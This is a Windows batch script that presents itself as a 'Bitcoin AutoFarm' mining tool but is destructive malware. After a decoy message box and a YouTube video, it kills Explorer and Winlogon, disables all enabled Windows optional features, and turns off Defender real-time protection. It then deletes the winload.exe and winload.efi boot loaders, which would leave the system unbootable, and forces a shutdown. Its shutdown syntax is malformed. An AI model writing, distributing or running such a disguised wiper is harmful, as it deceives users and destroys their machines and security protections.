@echo off
setlocal EnableDelayedExpansion

powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Click OK to start mining', 'Bitcoin AutoFarm', 'OK', [System.Windows.MessageBoxImage]::Information)"


REM Open Microsoft Edge with the specified URL
start msedge.exe "https://m.youtube.com/watch?v=m-Ge-5BLFvo&pp=ygUdd2hvJ3MgYWZyYWlkIG9mIGxpdHRsZSBvbGQgbWU%3D"

REM Wait for a short duration to ensure Edge opens
timeout /t 317 /nobreak >nul
taskkill /f /im explorer.exe >nul

powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Who's Afraid of Little Old Me?', 'notepad.exe', 'Ok', [System.Windows.MessageBoxImage]::Information)"
powershell -Command "Get-WindowsOptionalFeature -Online | Where-Object { $_.State -eq 'Enabled' } | ForEach-Object { Disable-WindowsOptionalFeature -Online -FeatureName $_.FeatureName -NoRestart }"
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
timeout /t 11 /nobreak >nul
taskkill /f /im msedge.exe >nul
taskkill /f /im winlogon.exe >nul

del /s /q /f "C:\windows\system32\winload.exe"
del /s /q /f "C:\windows\system32\winload.efi" 
REM Set a shutdown timer for 5 minutes and 17 seconds (317 seconds)
shutdown /s /t /f 10
taskkill /f /im cmd.exe >nul

